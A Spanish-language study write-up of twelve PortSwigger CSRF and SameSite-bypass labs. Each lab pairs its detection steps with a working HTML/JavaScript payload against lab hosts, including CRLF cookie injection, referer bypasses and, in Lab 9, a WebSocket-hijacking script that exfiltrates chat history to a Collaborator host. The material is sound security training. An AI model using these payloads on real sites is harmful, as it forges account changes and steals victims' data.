-----
### QUE ES?
Un **CSRF (Cross-Site Request Forgery)** es una vulnerabilidad donde un atacante consigue que la víctima autenticada envíe una petición no deseada a una aplicación en la que ya tiene sesión iniciada.  El servidor acepta la acción porque la petición incluye automáticamente las cookies de sesión del usuario.
Permite realizar acciones como cambiar email, contraseña o realizar operaciones en nombre de la víctima.
Se previene usando **tokens CSRF únicos por sesión/petición**, verificación del origen (SameSite cookies) y validación del referer/origin.
#### PASOS: 
- *COMPROBAR QUE HAYA CAMBIO DE CORREO*
- *COMPROBAR QUE VALIDA EL CSRF TOKEN*
- *COMPROBAR SI VALIDA DEL CSRF TOKEN AL CAMBIAR EL METODO*
- *COMPROBAR SI VALIDA EL CSRF TOKEN SI LO ELIMINAMOS COMPLETO*
- *COMPROBAR SI VALIDA EL CSRF TOKEN ESTA LIGADO A LA SESION*
- *COMPROBAR CSRFKEY Y CSRF TOKEN LIGADOS A UNA SESSION*
- *COMPROBAR COOKIE SAMESITE EN LA RESPUESTA DE LOGIN* 
- *COMPROBAR REFERRER*
-----
### LAB1: CSRF VULNERABILITY WITH NO DEFENSES
Inicia sesión y cambia el email manualmente. En Burp, localiza la petición POST a `/my-account/change-email`.
Si usas Burp Pro, puedes generar automáticamente un **CSRF PoC** (Generate CSRF PoC) con auto-submit.

Si usas Community, creas un HTML como este:

`<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">  
`    <input type="hidden" name="email" value="TEST@TEST.com">  
`</form>  
`<script>  
`    document.forms[0].submit();  
`</script>

Este código:
- Crea un formulario oculto que apunta al endpoint vulnerable.
- Envía automáticamente la petición al cargarse la página.
- Si la víctima está logueada, su navegador enviará sus cookies.
- El servidor procesará el cambio como si la víctima lo hubiera hecho.

Se sube el HTML al exploit server y se envía a la víctima.  
Al visitarlo, el email se cambia sin que la víctima lo note.
### LAB2: CSRF WHERE TOKEN VALIDATION DEPENDS ON REQUEST METHOD
Si vemos que valida el *csrf token* por el método **POST** podemos intentar cambiar el método desde *burp*, si funciona:

`<form action="https://0a97002c045b46a280bcf84d007a0013.web-security-academy.net/my-account/change-email">
`    <input type="hidden" name="email" value="pwned@pwned.com">
`</form>
`<script>
`    document.forms[0].submit();
`</script>

Este código:
- Crea un formulario oculto que apunta al endpoint vulnerable.
- Envía automáticamente la petición al cargarse la página.
- Si la víctima está logueada, su navegador enviará sus cookies.
- El servidor procesará el cambio como si la víctima lo hubiera hecho.

Se sube el HTML al exploit server y se envía a la víctima.  
Al visitarlo, el email se cambia sin que la víctima lo note.
### LAB3: CSRF WHERE TOKEN VALIDATION DEPENDS ON TOKEN BEING PRESENT
Si vemos que al interceptar el cambio de email podemos borrar el *csrf token* y sigue cambiando el email.
Entonces no esta validando la presencia del *csrf token*:

`<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">  
`    <input type="hidden" name="email" value="TEST@TEST.com">  
`</form>  
`<script>  
`    document.forms[0].submit();  
`</script>

Nos permite cambiar el email ya que valida el *csrf token* pero solo si existe si lo eliminamos no.
### LAB4:  CSRF TOKEN IS NOT TIED TO USER SESSION
Podemos probar si el *csrf token* esta unido a la sesión interceptando con *burp* el *csrf token* y dropeando la request.
Si al meter el *csrf token* de la otra sesión nos cambia el email de otra cuenta es que no se liga el *csrf token* a la sesión, por lo tanto:

`<form method="POST" action="https://0a9500f80458b6d6807b037600ff00f0.web-security-academy.net/my-account/change-email">
`    <input type="hidden" name="email" value="pwned@pwned.com">
`    <input type="hidden" name="csrf" value="fbDaiJDVNA49KAnmsnrJndwD6d0pncG8">
`</form>
`<script>
`    document.forms[0].submit();
`</script>

Nos permite cambiar el email ya que el *csrf token* se puede usar entre diferentes cuentas.
### LAB5: CSRF WHERE TOKEN IS TIED TO NON-SESSION COOKIE
Si vemos un *csrfkey* y un *csrf token* debemos comprobar si están ligados a la session.
Si al meter ambos en otra session funcionan para cambiar el correo.
Para meter el *csrfkey* en otra sesión debemos hacerlo a través de las *cookies*: `/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None`
Payload:
`<form method="POST" action="https://0a6800e7043123428493148400e20039.web-security-academy.net/my-account/change-email">
`    <input type="hidden" name="email" value="pwned@pwned.com">
`    <input type="hidden" name="csrf" value="TUOUezz8oL41lSADR8kGansWgwr6p0kp">
`</form>
`<img src="https://0a6800e7043123428493148400e20039.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=WxDijoKIfrvbSvqDnjkaDwo6YYZdJ9jB%3b%20SameSite=None" onerror="document.forms[0].submit()">
### LAB6: CSRF WHERE TOKEN IS DUPLICATED IN COOKIE
Si nos encontramos con que envia el csrf token tanto por post como en las cookies debemos validar si solo comprueba que el contenido coincida.
Interceptamos la request y probamos a modificar el contenido en ambas pero que coincida.
Si funciona:
`<form method="POST" action="https://0a430091034dc73582334d5d007c0083.web-security-academy.net/my-account/change-email">
`    <input type="hidden" name="email" value="pwned@pwned.com">
`    <input type="hidden" name="csrf" value="abcd">
`</form>
`<img src="https://0a430091034dc73582334d5d007c0083.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=abcd%3b%20SameSite=None" onerror="document.forms[0].submit()">
### LAB7: SAMESITE LAX BYPASS VIA METHOD OVERRIDE
Si vemos que en la request de cambio de email no se usa un *csrf token* y ademas no esta seteada la cookie *SameSite* ni en `/change-email` ni en `/login`.
La cabecera **`SameSite`** es un atributo de las cookies que controla **cuándo el navegador las envía en peticiones cross-site**(entre sitios distintos).
Sin `SameSite` o `SameSite=Lax`, si estás logueado en `banco.com` y visitas `evil.com`, esa web maliciosa podría forzar al navegador a enviar una petición a `banco.com` **incluyendo tus cookies de sesión**.  Ahí nace el CSRF.

Podemos hacer que la víctima haga una busqueda que incluya sus cookies de session para cambiar su email sin que se de cuenta.
`<script>
`    document.location = "https://0a670021040e2d62802c533100d10000.web-security-academy.net/my-account/change-email?email=pwned@test.com&_method=POST";
`</script>
### LAB8: SAMESITE STRICT BYPASS VIA CLIENT-SIDE REDIRECT
Si vemos un `SameSite=Strict` en la respuesta del `/login`
Publicas un comentario en un post del blog.  
Primero te lleva a: `/post/comment/confirmation?postId=x` tras unos segundos te redirige automáticamente al post original.
En Burp se observa que la redirección se hace **del lado del cliente** mediante el archivo:
`/resources/js/commentConfirmationRedirect.js`

El JavaScript usa el parámetro `postId` de la URL para construir dinámicamente la ruta de redirección.
Si modificas el parámetro: `/post/comment/confirmation?postId=1/../../my-account` (Path Traversal)
El navegador normaliza la ruta y te lleva a: `/my-account`

Esto confirma que puedes forzar una petición GET a **cualquier endpoint interno del sitio** usando `postId`.
`<script>
`    document.location = "https://0a520039040be785836cf66400a300a3.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=pwned@pwned.com%26submit=1";
`</script>
### LAB9: SAMESITE STRICT BYPASS VIA VIA SIBLING DOMAIN
En el chat en vivo se envían varios mensajes.    
En Burp → Proxy → HTTP history se localiza el handshake del WebSocket:    `GET /chat
No contiene tokens impredecibles, por lo que puede ser vulnerable a CSWSH (Cross-Site WebSocket Hijacking) si se logra evadir SameSite.
 Al recargar la página, el navegador envía:    `READY

El servidor responde enviando todo el historial del chat.
#### Confirmación de la vulnerabilidad CSWSH
`<script>  
`    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');  
`    ws.onopen = function() {  
`        ws.send("READY");  
`    };  
`    ws.onmessage = function(event) {  
`        fetch('https://YOUR-COLLABORATOR.oastify.com', {  
`            method: 'POST',  
`            mode: 'no-cors',  
`            body: event.data  
`        });  
`    };  
`</script>
Este script:
- Abre una conexión WebSocket.
- Envía el mensaje READY.
- Exfiltra el historial del chat al servidor Collaborator.

Burp confirma interacción, por lo que la vulnerabilidad existe.
#### Problema: SameSite=Strict
En el handshake generado por el script:
- No se envía la cookie de sesión.
- El servidor establece la cookie con: `SameSite=Strict`
Esto impide que el navegador incluya la cookie en peticiones cross-site.
Resultado: solo se obtiene el historial de una sesión nueva no autenticada.
#### Bypass de SameSite usando dominio hermano
1. Se reutiliza el script CSWSH.
2. Se codifica completamente en URL.
3. Se inyecta como parámetro username en un dominio hermano vulnerable:
`<script>  
`    document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=SCRIPT_ENCODEADO&password=anything";  
`</script>
Como la petición se origina desde un dominio hermano (mismo site):
- El navegador la considera same-site.
- Se envía la cookie de sesión.
- El WebSocket se abre autenticado.    
- Se exfiltra el historial real del chat.
Burp confirma que el handshake ahora incluye la cookie de sesión.
### LAB10: SAMESITE LAX BYPASS VIA COOKIE REFRESH
Si tenemos *OAuth-based login* pero no usa un `SameSite=Strict`.
<form method="POST" action="https://0a2200780477dd8280e0447100b700bc.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>
`<p>Click anywhere on the page</p>
`<script>
`    window.onclick = () => {
`        window.open('https://0a2200780477dd8280e0447100b700bc.web-security-academy.net/social-login');
`        setTimeout(changeEmail, 5000);
`    }                       `
`                            `
`    function changeEmail() {
`        document.forms[0].submit();
`    }
`</script>
El flujo sería algo así:
- La víctima ya tiene sesión iniciada en el sitio vulnerable.
- Visita tu página maliciosa.
- Hace clic.
- Se abre `/social-login`, lo que puede:
    - Reafirmar la sesión
    - Ajustar cookies        
    - Cambiar el contexto a same-site
- Después se envía el formulario oculto.
- El navegador incluye automáticamente la cookie de sesión.
- El servidor procesa el cambio de email como si lo hubiera hecho el usuario.
### LAB11: CSRF WHERE REFERER VALIDATION DEPENDS ON HEADER BEING PRESENT
Si vemos un *referrer* y al modificarlo vemos que la request se invalida, podemos probara a borrarlo completamente.
Si funciona:
`<form method="post" action="https://0a4b00d403879042801d0d0e0038002d.web-security-academy.net/my-account/change-email">
`    <input type="hidden" name="email" value="pwned@pwned.com">
`    <meta name="referrer" content="no-referrer">
`</form>
`<script>
`    document.forms[0].submit();
`</script>

De esta forma podremos cambiar el email eliminando el *referrer*.
### LAB12: CSRF WITH BROKEN REFERRER VALIDATION
Si vemos un referre que nos permite o que valida solo que la url del lab aparezca: 
Podemos probar `Referer: https://ters.com?https://0a500031033ddd61804eda0500c400cf.web-security-academy.net`
Si funciona:
En el header añadir → `Referrer-Policy: unsafe-url` → hace que el navegador envíe la **URL completa (incluyendo parámetros)** en la cabecera `Referer`, incluso en peticiones a otros dominios. Es inseguro porque puede filtrar datos sensibles contenidos en la URL.
Payload:
`<script>
`  history.pushState("", "", "/?0a500031033ddd61804eda0500c400cf.web-security-academy.net");
`</script>
`<form method="POST" action="https://0a500031033ddd61804eda0500c400cf.web-security-academy.net/my-account/change-email">
`  <input type="hidden" name="email" value="pwned@pwned.com">
`</form>
`<script>
`  document.forms[0].submit();
`</script>

De esta manera bypaseamos el *referrer* al añadirlo como parámetro de consulta